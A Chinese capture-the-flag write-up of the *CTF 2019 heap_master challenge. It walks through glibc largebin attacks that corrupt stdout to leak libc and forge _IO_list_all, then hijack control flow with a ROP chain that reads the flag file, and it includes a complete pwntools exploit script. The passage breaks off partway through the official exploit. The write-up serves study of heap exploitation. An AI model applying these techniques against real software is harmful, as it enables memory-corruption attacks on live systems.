# starctf 2019 heap_master

starctf的heap_master题目，重现了一遍官方的exp和ROIS战队的exp，学到了太多了。

## 题目简述
题目在开始随机mmap了一段大小为0x10000的内存，作为heap_base，此后的edit和delete功能都是基于heap_base根据偏移来对堆块进行编辑和释放操作，但是add功能却是常规的malloc堆块，malloc的大小没有限制。但是题目没有show的功能。

```
$ ./heap_master 
=== Heap Master ===
1. Malloc
2. Edit
3. Free
>>
```

题目给出的libc版本是2.25.

```
ubuntu@ubuntu:~/Documents/pwn/2019/starctf/heap_master/share$ strings libc.so.6 | grep "GNU C"
GNU C Library (Debian GLIBC 2.25-6) stable release version 2.25, by Roland McGrath et al.
Compiled by GNU CC version 6.4.0 20171206.
```

## 题目漏洞
题目的edit和delete功能可以让我们将堆迁移到heap_base这段内存中，而且edit功能没有堆块索引的判断和大小的限制，相当于我们可以任意edit。没有show功能可以修改stdout的flag来进行输出。参考的exp和官方给出的exp都是用了largebin attack，最近好像这种利用方式比较多，RCTF的babyheap也是。

### 调试环境
因为libc的版本是2.25，总不能像每次做题一样又安一个虚拟机吧，看了姚老板的博客用了下面这个脚本，脚本来源于这篇文章。加载了指定的libc之后就不能查看堆的内容了，所以可以在本机libc上把堆的都调好了之后再更换libc。

## 利用过程-ROIS的exp
这里利用过程的调试都是基于ubuntu 16.04和libc 2.23进行调试的。

### largebin attack泄露libc
首先初始化，主要创造了大小为0x330、0x410和0x410的堆块，然后将chunk 1和chunk 2释放到unsorted bin中。

```python
offset = 0x8060

##chunk:0x330 0x30
edit(offset+0x8,p64(0x331)) #1
edit(offset+0x8+0x330,p64(0x31))
##chunk 0x410 0x30
edit(offset+0x8+0x360,p64(0x411)) #2
edit(offset+0x8+0x360+0x410,p64(0x31))
##chunk 0x410 0x30 0x30
edit(offset+0x8+0x360+0x440,p64(0x411)) #3
edit(offset+0x8+0x360+0x440+0x410,p64(0x31))
edit(offset+0x8+0x360+0x440+0x440,p64(0x31))

##unsorted bin:0x410(2)->0x330(1)
delete(offset+0x10) #1 0x330
delete(offset+0x10+0x360) #2 0x410
```

下面进行add操作时，未被分配的堆块会进入到相应的bins中，这里add(0x90),那么大小为0x410的chunk 2进入到largebin中。我们下面需要利用stdout来泄露libc，因此需要一个开头为0x7f的地址，因此我们可以构在chunk 2(0x410)上构造两个大小大于0xb0的chunk，这里构造的是0x100，使其释放进入unsorted bin中，这样它的fd和bk以及fd_nextsize和bk_nextsize就有了main_arena附近的地址。

```python
##unsorted bin:0x330-0xa0=0x290
##largebin:0x410 chunk 2
add(0x90) #0xa0

##edit size + fd + bk
edit(offset+0x8+0x360,p64(0x101)*3) #2 size+fd+bk
edit(offset+0x8+0x460,p64(0x101)*3) #chunk 2 + 0x100
edit(offset+0x8+0x560,p64(0x101)*3) #chunk 2 + 0x200

##unsorted bin:0x60(chunk 2-0xa0)
##smallbin:0x60(chunk 2+0x10-0xa0)
##smallbin:0x290
##largebin:chunk 2
delete(offset+0x10+0x370) #0x100 free (chunk 2+0x10)
add(0x90) #(chunk 2 + 0x10)-0xa0
delete(offset+0x10+0x360) #0x100 free (chunk 2)
add(0x90) #chunk 2-0xa0
```

此时bins的分布如下：

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555757020 (size : 0x20fe0) 
       last_remainder: 0x945eb460 (size : 0x60) 
            unsortbin: 0x945eb460 (size : 0x60)
(0x290)  smallbin[39]: 0x945eb100
(0x060)  smallbin[ 4]: 0x945eb470 (size error (0x7ffff7dd1b78))
         largebin[ 0]: 0x945eb3c0 (doubly linked list corruption 0x945eb3c0 != 0x7ffff7dd1c68 and 0x945eb3c0 is broken)
gdb-peda$ x /8gx 0x945eb3c0
0x945eb3c0: 0x0000000000000000  0x00000000000000a1
0x945eb3d0: 0x00007ffff7dd1c68  0x00007ffff7dd1c68
0x945eb3e0: 0x00007ffff7dd1c68  0x00007ffff7dd1c68
0x945eb3f0: 0x0000000000000000  0x0000000000000000
```

下面我们再修改largedbin的大小为正常的largebin大小，修改其bk为stdout-0x10，修改其bk_nextsize为stdout+0x19-0x20，因为当一个大小为largedbin的chunk插入到largebin中时，它与其他bins的不同，除了要维护一个fd和bk的双向链表之外，它还会有一个所有chunk组成的fd_nextsize和bk_nextsize的双向链表，这个链表中chunk按照从大到小排列，插入时如果链表中没有与待插入堆块相同的chunk，该堆块就会遍历链表插入到相应的位置(总能找到一个小于它的chunk，插入到它前面)，同时更新fd_nextsize和bk_nextsize，如果链表中有相同大小的chunk，不会更新fd_nextsize和bk_nextsize，找到与待插入堆块相同的chunk，插入到该堆块后面。其实也很好理解，因为由fd_nextsize和bk_nextsize维护的链表是根据size大小排列的，遍历的目的也是根据size来插入或查找，所以相同大小的chunk就不会更新这两个指针了，因为它前面还有若干与它相同大小的chunk。完成这个链表的更新后，再进行常规的fd和bk链表的更新。libc中代码如下：

```c
else {
                
                victim_index = largebin_index(size); //victim是要插入的chunk
                bck          = bin_at(av, victim_index); // 当前largebin的头部
                fwd          = bck->fd; //largebin中的第一个chunk

                /* maintain large bins in sorted order */
                //按照从大到小降序排列
                // 如果 large bin 链表不空
                if (fwd != bck) {
                    /* Or with inuse bit to speed comparisons */
                    size |= PREV_INUSE;
                    /* if smaller than smallest, bypass loop below */
                    //bck->bk中存储着当前largebin中最小的chunk
                    assert(chunk_main_arena(bck->bk));//判断bck->bk是否在main arena
                    if ((unsigned long) (size) <
                        (unsigned long) chunksize_nomask(bck->bk)) {//如果插入的chunk比当前最小的chunk还小，只需插入到链表尾部
                        fwd = bck; //fwd指向链表头部
                        bck = bck->bk; //bck指向链表尾部
                        victim->fd_nextsize = fwd->fd; //victim->fd_nextsize指向链表中第一个chunk
                        //victim->bk_nextsize指向原来链表第一个chunk指向的bk_nextsize，即原来链表的最后一个chunk
                        victim->bk_nextsize = fwd->fd->bk_nextsize; 
                        //原来链表第一个chunk的bk_nextsize指向victim
                        //原来最后一个链表的最后一个chunk的fd_nextsize指向victim
                        fwd->fd->bk_nextsize =
                            victim->bk_nextsize->fd_nextsize = victim;
                        
                    } else {//插入的chunk的大小大于当前链表中最小的chunk
                        assert(chunk_main_arena(fwd)); //判断fwd是否在main arena中
                        while ((unsigned long) size < chunksize_nomask(fwd)) {
                            //从链表头部遍历寻找不大于victim的chunk
                            fwd = fwd->fd_nextsize;
                            assert(chunk_main_arena(fwd));
                        }
                        if ((unsigned long) size ==
                            (unsigned long) chunksize_nomask(fwd)) //如果找到与victim大小相等的chunk，直接插入，不修改nextsize
                            /* Always insert in the second position.  */
                            fwd = fwd->fd; 
                        else { //找到小于victim的chunk,fwd指向比victim小的chunk,插入到fwd前面
                            victim->fd_nextsize              = fwd;  //victim->fd_nextsize指向fwd
                            //victim->bk_nextsize指向原来fwd的前一个chunk
                            victim->bk_nextsize              = fwd->bk_nextsize;
                            //fwd的bk_nextsize指向victim
                            fwd->bk_nextsize                 = victim;
                            //fwd原来前一个chunk的fd_nextsize指向victim
                            victim->bk_nextsize->fd_nextsize = victim;
                        }
                        bck = fwd->bk;
                    }
                } else
                    //如果当前largebin链表为空，则插入的victim自己构成一个双向链表
                    victim->fd_nextsize = victim->bk_nextsize = victim;
    }
    ...
    ...
    //插入当前bin中第一个chunk的前面,更新bin中的双向链表
    mark_bin(av, victim_index);
    victim->bk = bck; //victim->bk指向bck，bck=fwd->bk
    victim->fd = fwd; //victim->fd指向当前bin中的第一个chunk
    fwd->bk    = victim; //原来bin中的第一个chunk的bk指向victim
    bck->fd    = victim; //bck的fd指向victim,也就是fwd->bk->fd指向victim
```

看到实现代码我们有两个地方可以利用，前提是我们能修改当前largebin中第一个chunk的bk和bk_nextsize，这道题里我们是可以修改的。

```c
//利用点1
victim->bk_nextsize->fd_nextsize = victim;
//其中左边的值是
victim->bk_nextsize = fwd->bk_nextsize; //fwd就是largebin中原有的chunk
//利用点2
bck->fd  = victim; 
//其中左边的值是
bck = fwd->bk; //同样fwd就是largebin中原有的chunk
```

在利用时我们将其修改为下面的内容：

```c
fwd->bk = stdout - 0x10
fwd->bk_nextsize = stdout+0x19-0x20
```

那么在一个大小在largebin范围内的chunk插入时(待插入chunk的大小为0x440)，链表中原有的chunk大小为0x3f0，插入到0x3f0的chunk前面。就会发生下面的赋值操作：

```c
//victim就是待插入chunk的地址
victim->bk_nextsize->fd_nextsize = fwd->bk->fd_nextsize = *(stdout+0x19-0x20+0x20) = *(stdout+0x19) = victim
bck->fd = fwd->bk->fd = *(stdout-0x10+0x10) = *(stdout) = victim
```

这里说一下为什么要这样修改，因为修改stdout来泄露需要满足下面的条件：

```c
//flag的要求
f->flag & 0xa00 and f->flag & 0x1000 == 1 //通过写入堆的地址来构造
//write_base的偏移是0x20
f->write_base != f->write_ptr //通过覆盖write_base的低字节为'\x00'来实现
```

具体关于largebin attack的分析可以看这篇博客。

在输出之前在puts下断点就可以看到stdout目前的情况如下，这样我们就可以泄露以write_base起始，到write_ptr结束的内容，可以同时泄露heap和libc地址。

```
gdb-peda$ x /8gx 0x00007ffff7dd2620
0x7ffff7dd2620 <_IO_2_1_stdout_>:   0x00000000945eb800  0x00007ffff7dd26a3
0x7ffff7dd2630 <_IO_2_1_stdout_+16>:    0x00007ffff7dd26a3  0x000000945eb800a3
0x7ffff7dd2640 <_IO_2_1_stdout_+32>:    0x00007ffff7dd2600  0x00007ffff7dd26a3
0x7ffff7dd2650 <_IO_2_1_stdout_+48>:    0x00007ffff7dd26a3  0x00007ffff7dd26a3
gdb-peda$ x /8gx 0x00007ffff7dd2620+0x19
0x7ffff7dd2639 <_IO_2_1_stdout_+25>:    0x00000000945eb800  0xa300007ffff7dd26
0x7ffff7dd2649 <_IO_2_1_stdout_+41>:    0xa300007ffff7dd26  0xa300007ffff7dd26
0x7ffff7dd2659 <_IO_2_1_stdout_+57>:    0xa400007ffff7dd26  0x0000007ffff7dd26
0x7ffff7dd2669 <_IO_2_1_stdout_+73>:    0x0000000000000000  0x0000000000000000
```

在本地libc的基础上地址泄露情况如下图所示：

```
[DEBUG] Received 0x4d bytes:
00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00000010  00 00 00 00  00 00 00 00  e0 06 dd f7  ff 7f 00 00
...

heap_base: 0x945e3000
leak_addr: 0x7ffff7dd06e0
libc_base: 0x7ffff7a0d000
```

exp这部分的具体构造如下：

```python
##largebin attack
##fwd->bk = stdout - 0x10
##fwd->bk_next_size = stdout+0x19-0x20
##stdout->victim
##stdout+0x19->victim
##(flag & 0xa00) and (flag & 0x1000 == 1) and (flag)
##_IO_write_base(stdout+0x20) partial write 0x00
edit(offset+0x8+0x360,p64(0x3f1)+p64(0)+p16(stdout-0x10)) #chunk 2->bk
edit(offset+0x8+0x360+0x18,p64(0)+p16(stdout+0x19-0x20)) #chunk 2->bk_nextsize
delete(offset+0x10+0x360+0x440) #free chunk 3(0x410)
add(0x90)
```

### largebin attack伪造IO_list_all

在exp中进行新的一轮的largebin attack来伪造IO_list_all，从而在程序退出时劫持控制流。开始我不知道为什么要这样做，后来发现在给出的文件pwn的内容才明白，chroot这个命令用来在指定的根目录下运行指令，题目将根目录由./修改为./heap_master，因为我没有打这个比赛，不知道比赛服务器的目录，我的理解是这样如果我们用常规的one_gadget获得shell后，不能在获得shell的读取flag，因此只能使用常规的ROP来读取flag。

```bash
#!/bin/bash
cd `dirname $0`
exec 2>/dev/null
chroot --userspec=pwn:pwn ./ ./heap_master
```

再说一下为什么伪造IO_list_all，在程序执行exit函数退出时系统会调用_IO_flush_all_lockp，该函数会会刷新_IO_list_all 链表中所有项的文件流，对每个FILE调用_IO_FILE_plus.vtable 中的_IO_overflow，这和FSOP里利用malloc_printerr->_libc_message(error msg)->abort->_IO_flush_all_lockp->_IO_overflow是一样的道理。

和上面一样，首先进行堆块的构造：

```python
##new largebin attack
offset = 0x100
edit(offset+0x8,p64(0x331)) #1
edit(offset+0x8+0x330,p64(0x31))
edit(offset+0x8+0x360,p64(0x511)) #2
edit(offset+0x8+0x360+0x510,p64(0x31))
edit(offset+0x8+0x360+0x540,p64(0x511)) #3
edit(offset+0x8+0x360+0x540+0x510,p64(0x31))
edit(offset+0x8+0x360+0x540+0x540,p64(0x31))

delete(offset+0x10) #1 0x330
delete(offset+0x10+0x360) #2 0x510

add(0x90)
```

此时0x510的chunk 2进入到largebin中，bins的分布如下。

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555757020 (size : 0x20fe0) 
       last_remainder: 0x945eb240 (size : 0x150) 
            unsortbin: 0x945eb240 (size : 0x150)
(0x330)  smallbin[49]: 0x945e3100
(0x060)  smallbin[ 4]: 0x945eb460  <--> 0x945eb470 (size error (0x7ffff7dd1bc8))
         largebin[ 0]: 0x945eb3c0 (invaild memory)
         largebin[ 4]: 0x945e3460 (size : 0x510)
gdb-peda$ x /8gx 0x945e3460
0x945e3460: 0x0000000000000000  0x0000000000000511
0x945e3470: 0x00007ffff7dd1fa8  0x00007ffff7dd1fa8
0x945e3480: 0x00000000945e3460  0x00000000945e3460
0x945e3490: 0x0000000000000000  0x0000000000000000
```

同样我们要修改largebin中chunk的bk和bk_nextsize，这里是修改为_IO_list_all。

```python
##edit chunk 2 0x4f0
##fwd->bk = io_list_all - 0x10
##fwd->bk_nextsize = io_list_all - 0x20
edit(offset+0x8+0x360,p64(0x4f1)+p64(0)+p64(libc.symbols["_IO_list_all"]-0x10))
edit(offset+0x8+0x360+0x18,p64(0)+p64(libc.symbols["_IO_list_all"]-0x20))
```

再释放chunk 3，大小为0x510,add触发该堆块进入到largebin中去，大小比已经在largebin的chunk 2(0x3f0)要大，因此插入到它的前面。

```python
##unsorted bin:0x510
##smallbin:0x330
##largebin:0x3f0 0x4f0
##io_list_all -> victim (chunk 3 0x510)
delete(offset+0x10+0x360+0x540) #3 0x510
add(0x200)
```

发生下面的赋值操作。这里的victim是要插入的偏移为offset+0x360+0x540的堆块。

```c
victim->bk_nextsize->fd_nextsize = fwd->bk->fd_nextsize = *(_IO_list_all-0x20+0x20) = *(_IO_list_all) = victim
bck->fd = fwd->bk->fd = *(_IO_list_all-0x10+0x10) = *(_IO_list_all) = victim
```

add完成后，_IO_list_all的地址被修改为偏移为offset+0x360+0x540的堆块的起始地址。

```
gdb-peda$ p &_IO_list_all
$1 = (struct _IO_FILE_plus **) 0x7ffff7dd2520 <_IO_list_all>
gdb-peda$ x /8gx 0x7ffff7dd2520
0x7ffff7dd2520 <_IO_list_all>:  0x00000000945e39a0  0x0000000000000000
0x7ffff7dd2530: 0x0000000000000000  0x0000000000000000
0x7ffff7dd2540 <_IO_2_1_stderr_>:   0x00000000fbad2086  0x0000000000000000
0x7ffff7dd2550 <_IO_2_1_stderr_+16>:    0x0000000000000000  0x0000000000000000
```

文件结构由一个叫_IO_FILE_plus的结构体维护，它包含一个_IO_FILE结构体和一个指向函数跳转表的指针。程序所有的FILE结构会通过_IO_FILE结构体中的成员_chain链成一个链表，其头部为全局变量_IO_list_all。在程序退出时，程序会根据_IO_list_all去寻找程序中的FILE结构，因此我们需要在偏移为offset+0x360+0x540的堆块中伪造_IO_FILE结构体。

下面是该结构体成员的偏移，其中偏移为0xd8是虚表指针，因为libc版本是2.25，在libc2.24及之后的libc版本中都对虚表指针的地址进行了检查，虚表指针的范围只能在__libc_IO_vtables段内，因此在exp中，在offset+0x360+0x540处伪造了一个合法的虚表指针_IO_str_jumps，因此整个调用过程如下：

```
exit()->_IO_flush_all_lockp()->_IO_overflow()->_IO_str_jumps->_IO_str_overflow()
```

_IO_FILE结构体的偏移如下：

```c
//struct _IO_FILE
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

### 劫持控制流执行rop
先把后续exp的构造写在这，这样后面执行过程会看的清楚一些。这些rop都是基于libc2.23的。

```python
_IO_str_jump = p64(libc.address + (0x7ffff7dd07a0-0x00007ffff7a0d000))
pp_j = g(0x12d751)  #pop rbx;pop rbp;jmp rdx
p_rsp_r = g(0x03838) #pop rsp;ret
p_rsp_r13_r = g(0x0206c3) #pop rsp;pop r13;ret
p_rdi_r = g(0x21102) #pop rdi;ret
p_rdx_rsi_r = g(0x1150c9) #pop rdx;pop rsi;ret

##rbx=rdi->fake IO_list_all(offset+0x360+0x540)
##mov rdx,[rdi+0x28] -> p_rsp_r13_r
##call QWORD PTR [rbx+0xe0] - > call [offset+0x360+0x540+0xe0] -> pp_j
##pp_j -> jmp rdx -> p_rsp_r13_r
fake_IO_strfile = p64(0) + p64(p_rsp_r)
fake_IO_strfile += p64(heap_base+8) + p64(0)
fake_IO_strfile += p64(0) + p64(p_rsp_r13_r)

orw = [
   p_rdi_r,heap_base,
   p_rdx_rsi_r, 0, 0,
   libc.symbols["open"],
   p_rdi_r, 3,
   p_rdx_rsi_r, 0x100, heap_base+0x1337,
   libc.symbols["read"],
   p_rdi_r, 1,
   p_rdx_rsi_r, 0x100, heap_base+0x1337,
   libc.symbols["write"],
]

edit(0,'./flag\x00\x00'+flat(orw))
edit(offset+0x360+0x540,fake_IO_strfile)
##io_list_all+0xd8:vtable
edit(offset+0x360+0x540+0xd8,_IO_str_jump)
edit(offset+0x360+0x540+0xe0,p64(pp_j))
```

在程序根据虚表指针最终调用_IO_str_overflow函数，在这个函数下断点，可以看到后续的具体执行过程，程序最后跳转到该函数，其中rbx和rdi寄存器的值就是offset+0x360+0x540：

```
RBX: 0x945e39a0
...
RDI: 0x945e39a0
```

继续执行，会执行到一个mov rdx,[rdi+0x28]的语句，我们exp中构造的是p64(p_rsp_r13_r):

img3

再继续执行，会有一个函数调用call QWORD PTR [rbx+0xe0]，相当于call [offset+0x360+0x540+0xe0]，exp里写的是p64(pp_j)。

img4

跟进这个函数，因为这个rop是pop rbx;pop rbp;jmp rdx，因此程序跳转到rdx寄存器指向的地址去执行，rdx前面赋值为p64(p_rsp_r13_r)。

img5

首先是pop rsp，这里的rop第一个是pop rsp,这样把栈迁移到了offset+0x360+0x540上。

img6

在offset+0x360+0x540上我们写的是fake_IO_strfile，下面分析一下fake_IO_strfile与接下来执行指令的对应。

```
//fake_IO_strfile
pop r13 : p64(0)
retn ： p64(p_rsp_r))
---pop rsp : p64(heap_base+8)
---retn : *(heap_base+8) = flat(orw)
```

retn返回到*(heap_base+8),这里我们提前布置的是flat(orw)，继续执行将执行orw里面的shellcode，接下来就是常规的打开文件，读文件，write输出flag。

img7

这里说一下orw的shellcode里面在read里rdi寄存器的值为什么是3，希望构造的调用是这样的，read(fd,heap_base+0x1337,0x100)，这里fd是open的返回值，正好是3，因此直接将rdi赋值为3，调用read(3,heap_base+0x1337,0x100)。
最后得到flag。

img8

整个exp如下，参考了ROIS战队的exp和姚老板的exp。

```python
from pwn import *

context.update(os="linux",arch="amd64")
context.log_level = "debug"
#context.terminal = ["tmux","split","-h"]

p = process("./heap_master")

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


def add(size):
    p.recvuntil(">> ")
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def edit(idx,data):
    p.recvuntil(">> ")
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(len(data)))
    p.recvuntil("content: ")
    p.send(data)

def delete(idx):
    p.recvuntil(">> ")
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(idx))

def g(offset):
   return libc.address + offset


DEBUG = 1
if DEBUG:
   p = process("./heap_master")
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
   stdout = 0x2620
else:
   elf = change_ld('./heap_master', './ld-linux-x86-64.so.2')
   p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
   libc = ELF("./libc.so.6")
   stdout = 0x5600

offset = 0x8060

##chunk:0x330 0x30
edit(offset+0x8,p64(0x331)) #1
edit(offset+0x8+0x330,p64(0x31))
##chunk 0x410 0x30
edit(offset+0x8+0x360,p64(0x411)) #2
edit(offset+0x8+0x360+0x410,p64(0x31))
##chunk 0x410 0x30 0x30
edit(offset+0x8+0x360+0x440,p64(0x411)) #3
edit(offset+0x8+0x360+0x440+0x410,p64(0x31))
edit(offset+0x8+0x360+0x440+0x440,p64(0x31))

##unsorted bin:0x410(2)->0x330(1)
delete(offset+0x10) #1 0x330
delete(offset+0x10+0x360) #2 0x410


##unsorted bin:0x330-0xa0=0x290
##largebin:0x410 chunk 2
add(0x90) #0xa0
##edit size + fd + bk
edit(offset+0x8+0x360,p64(0x101)*3) #2 size+fd+bk
edit(offset+0x8+0x460,p64(0x101)*3) #chunk 2 + 0x100
edit(offset+0x8+0x560,p64(0x101)*3) #chunk 2 + 0x200

##unsorted bin:0x60(chunk 2-0xa0)
##smallbin:0x60(chunk 2+0x10-0xa0)
##smallbin:0x290
##largebin:chunk 2
delete(offset+0x10+0x370) #0x100 free (chunk 2+0x10)
add(0x90) #(chunk 2 + 0x10)-0xa0
delete(offset+0x10+0x360) #0x100 free (chunk 2)
add(0x90) #chunk 2-0xa0

gdb.attach(p)
##largebin attack
##fwd->bk = stdout - 0x10
##fwd->bk_next_size = stdout+0x19-0x20
##stdout->victim
##stdout+0x19->victim
##(flag & 0xa00) and (flag & 0x1000 == 1) and (flag)
##_IO_write_base(stdout+0x20) partial write 0x00
edit(offset+0x8+0x360,p64(0x3f1)+p64(0)+p16(stdout-0x10)) #chunk 2->bk
edit(offset+0x8+0x360+0x18,p64(0)+p16(stdout+0x19-0x20)) #chunk 2->bk_nextsize
delete(offset+0x10+0x360+0x440) #free chunk 3(0x410)
add(0x90)

if DEBUG:
   p.recvn(0x18)
   leak_addr = u64(p.recvn(8).ljust(8,'\x00'))
   libc.address = leak_addr - 0x3c36e0
   heap_base = u64(p.recvn(8)) - 0x8800
   print "heap_base:",hex(heap_base)
else:
   heap_base = u64(p.recvn(0x8)) -(0xd08e9800-0xd08e1000)
   leak_addr = u64(p.recvn(8).ljust(8,'\x00'))
   libc.address = leak_addr - 0x39e683
   ##heap_base
print "leak_addr:", hex(leak_addr)
print "libc_base:", hex(libc.address)
print "heap_base:", hex(heap_base)

#gdb.attach(p)


##new largebin attack
offset = 0x100
edit(offset+0x8,p64(0x331)) #1
edit(offset+0x8+0x330,p64(0x31))
edit(offset+0x8+0x360,p64(0x511)) #2
edit(offset+0x8+0x360+0x510,p64(0x31))
edit(offset+0x8+0x360+0x540,p64(0x511)) #3
edit(offset+0x8+0x360+0x540+0x510,p64(0x31))
edit(offset+0x8+0x360+0x540+0x540,p64(0x31))

delete(offset+0x10) #1 0x330
delete(offset+0x10+0x360) #2 0x510

add(0x90)

##edit chunk 2 0x4f0
##fwd->bk = io_list_all - 0x10
##ffwd->bk_nextsize = io_list_all - 0x20
edit(offset+0x8+0x360,p64(0x4f1)+p64(0)+p64(libc.symbols["_IO_list_all"]-0x10))
edit(offset+0x8+0x360+0x18,p64(0)+p64(libc.symbols["_IO_list_all"]-0x20))

##unsorted bin:0x510
##smallbin:0x330
##largebin:0x3f0 0x4f0
##io_list_all -> victim (chunk 3 0x510)
delete(offset+0x10+0x360+0x540) #3 0x510
add(0x200)


if DEBUG:
   _IO_str_jump = p64(libc.address + (0x7ffff7dd07a0-0x00007ffff7a0d000))
   pp_j = g(0x12d751)  #pop rbx;pop rbp;jmp rdx
   p_rsp_r = g(0x03838) #pop rsp;ret
   p_rsp_r13_r = g(0x0206c3) #pop rsp;pop r13;ret
   p_rdi_r = g(0x21102) #pop rdi;ret
   p_rdx_rsi_r = g(0x1150c9) #pop rdx;pop rsi;ret

else:
   #_IO_str_jumps = p64(libc.address + (0x00007ffff7dd1440-0x00007ffff7a37000))
   _IO_str_jump = p64(libc.address+0x39a500)
   pp_j = g(0x10fa54) #pop rbx;pop rbp;jmp rdx
   p_rsp_r = g(0x3870) #pop rsp;ret
   p_rsp_r13_r = g(0x1fd94) #pop rsp;pop r13;ret
   p_rdi_r = g(0x1feea) #pop rdi;ret
   p_rdx_rsi_r = g(0xf9619) #pop rdx;pop rsi;ret


##rbx=rdi->fake IO_list_all(offset+0x360+0x540)
##mov rdx,[rdi+0x28] -> p_rsp_r13_r
##call QWORD PTR [rbx+0xe0] - > call [offset+0x360+0x540+0xe0] -> pp_j
##pp_j -> jmp rdx -> p_rsp_r13_r
fake_IO_strfile = p64(0) + p64(p_rsp_r)
fake_IO_strfile += p64(heap_base+8) + p64(0)
fake_IO_strfile += p64(0) + p64(p_rsp_r13_r)

orw = [
   p_rdi_r,heap_base,
   p_rdx_rsi_r, 0, 0,
   libc.symbols["open"],
   p_rdi_r, 3,
   p_rdx_rsi_r, 0x100, heap_base+0x1337,
   libc.symbols["read"],
   p_rdi_r, 1,
   p_rdx_rsi_r, 0x100, heap_base+0x1337,
   libc.symbols["write"],
]

edit(0,'./flag\x00\x00'+flat(orw))
edit(offset+0x360+0x540,fake_IO_strfile)
##io_list_all+0xd8:vtable
edit(offset+0x360+0x540+0xd8,_IO_str_jump)
edit(offset+0x360+0x540+0xe0,p64(pp_j))
#gdb.attach(p)

p.sendlineafter(">> ",'0')
p.interactive()
```

## 利用过程-官方的exp

官方exp同样是利用largebin attack来利用stdout泄露，然后利用largebin attack来伪造_dl_open_hook结构体，_dl_open_hook结构体如下，目前还没弄清楚它什么时候才会被调用，只知道当它不为空时，会跳转到_dl_open_hook->dlopen_mode和_dl_open_hook->dlsym处去执行，如果我们能控制该结构体的内容，相当于有一次one_gadget的机会。

```c
//glibc-2.23  ./elf/dl_libc.c line 111
struct dl_open_hook
{
  void *(*dlopen_mode) (const char *name, int mode);
  void *(*dlsym) (void *map, const char *name);
  int (*dlclose) (void *map);
};
```

这个利用方式只能在给定的libc版本下才能成功，所以前面这些堆的分布都是基于libc2.23的，到了后面_dl_open_hook再转回lic2.25,前面主要是学习一下堆的构造，感觉很多题堆的构造就很巧妙，反正我大部分都想不出来。

### 修改stdout泄露libc
同样是构造两个堆块，大小分别为0x420和0x100。然后add触发大小为0x420的堆块进入到largebin中。

```python
edit(0x1000+0x8,p64(0x421)) #p1
edit(0x1000+0x8+0x420,p64(0x21))
edit(0x1000+0x8+0x440,p64(0x21))
delete(0x1010) #0x420

edit(0x500+0x8,p64(0x101)) #p2
edit(0x500+0x8+0x100,p64(0x21))
edit(0x500+0x8+0x120,p64(0x21))
delete(0x510) #0x100
##largebin:p1 0x420
add(0xf1) #0x100 unsorted bin empty
```

之后我们需要在p1的bk和bk_nextsize写入main_arena附近的地址，以便后续低字节覆写为stdout的地址。p1+0x10处构造一个0x100的堆块，这样我们就将bk_nextsize写入了main_arena附近的地址。

```python
edit(0x1000+0x10,p64(0)+p64(0x101))
edit(0x1000+0x10+0x100,p64(0)+p64(0x21))
edit(0x1000+0x10+0x120,p64(0)+p64(0x21))
delete(0x1020) #0x100
add(0xf0)
```

继续构造大小为0x410和0x100的堆块，并将其释放，这两个堆块进入到unsorted bin中。

```python
edit(0x2a10+0x8,p64(0x411))
edit(0x2a10+0x8+0x410,p64(0x21))
edit(0x2a10+0x8+0x430,p64(0x21))
delete(0x2a20) #0x410

edit(0x1500+0x8,p64(0x101))
edit(0x1500+0x8+0x100,p64(0x21))
edit(0x1500+0x8+0x120,p64(0x21))
delete(0x1510) #0x100
```

此时我们将largebin中chunk的bk_nextsize修改为stdout-0x20，add触发0x410的chunk进入到largebin中，因为此时largebin中的chunk大小为0x420，因此0x410的chunk插入到该chunk后面，stdout的flag被覆写为偏移为0x2a10的堆的起始地址。

```python
## if f->flag & 0xa00 and f->flag & 0x1000 == 1 then it will leak something when f->write_base != f->write_ptr
